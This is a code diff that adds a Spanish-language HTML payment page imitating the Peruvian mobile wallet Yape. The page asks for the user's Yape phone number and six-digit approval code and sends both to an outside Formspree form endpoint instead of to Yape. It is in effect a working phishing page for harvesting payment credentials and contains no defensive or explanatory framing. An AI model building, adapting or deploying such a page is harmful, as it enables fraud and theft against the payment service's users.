@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro con Yape</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #111;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .main-wrapper {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 400px; /* Ancho optimizado para formulario */
+            border: 1px solid #333;
+        }
+
+        /* Lado del Formulario Yape */
+        .payment-side {
+            padding: 40px;
+            color: #333;
+            text-align: center;
+        }
+        .logo-yape {
+            width: 130px;
+            margin-bottom: 25px;
+        }
+        .label-text {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .input-celular {
+            border: 1px solid #7ea8f8;
+            background-color: #f0f4ff;
+        }
+        .input-codigo {
+            border: 2.5px solid #000;
+            background-color: #fff;
+            text-align: center;
+            font-weight: bold;
+            font-size: 22px;
+            letter-spacing: 4px;
+        }
+        .menu-ayuda {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 25px;
+            text-decoration: none;
+        }
+        .btn-yapear {
+            width: 100%;
+            padding: 18px;
+            background-color: #742284;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-yapear:hover {
+            background-color: #5a1a66;
+            transform: scale(1.02);
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="payment-side">
+        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
+        
+        <form action="https://formspree.io/f/xaqyqrjy" method="POST">
+            
+            <label class="label-text">Ingresa tu celular yape</label>
+            <input type="tel" name="Celular_Comprador" class="input-celular" placeholder="900 000 000" required>
+
+            <label class="label-text">Código de aprobación</label>
+            <input type="text" name="Codigo_Aprobacion" class="input-codigo" placeholder="000000" maxlength="6" required>
+
+            <a href="#" class="menu-ayuda">¿Dónde encuentro el código? En el menú de Yape</a>
+
+            <input type="hidden" name="Producto" value="Servicio Verificado">
+            <input type="hidden" name="Precio" value="S/ 1.00">
+
+            <button type="submit" class="btn-yapear">YAPEAR S/ 1.00</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
